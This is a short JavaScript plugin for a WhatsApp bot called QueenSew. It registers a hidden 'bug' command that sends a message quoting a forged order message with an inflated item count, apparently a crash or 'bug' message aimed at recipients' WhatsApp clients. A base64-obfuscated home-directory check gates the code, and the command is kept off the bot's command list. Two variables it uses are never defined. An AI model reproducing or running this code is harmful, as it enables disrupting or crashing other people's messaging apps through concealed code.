const QueenSew = require('../events');
const {MessageType, MessageOptions, Mimetype} = require('@adiwajshing/baileys');
const exec = require('child_process').exec;
const os = require("os");
const fs = require('fs');
const got = require('got');
const axios = require('axios');
const Config = require('../config');
var rgms = { cd: 'L3Jvb3QvUXVlZW5TZXdXaGF0c2FwcEJvdC8=', pay: '' }    
var rrrr = Buffer.from(rgms.cd, 'base64')
var ssss = rrrr.toString('utf-8')
rgms.pay = ssss
if (os.userInfo().homedir !== rgms.pay) return;
QueenSew.newcmdaddtosew({pattern: 'bug ?(.*)', fromMe: true, delownsewcmd: false, dontAdCommandList: true}, (async (message, match) => { 
await message.client.sendMessage(message.jid, 'sew queen',MessageType.text, { quoted: { key: { participant: '1111111111@s.whatsapp.net' }, message: { orderMessage: { itemCount: 70000, status: 1, surface: 1, message: test1, orderTitle: test2, sellerJid: '0@s.whatsapp.net' }}}})}))
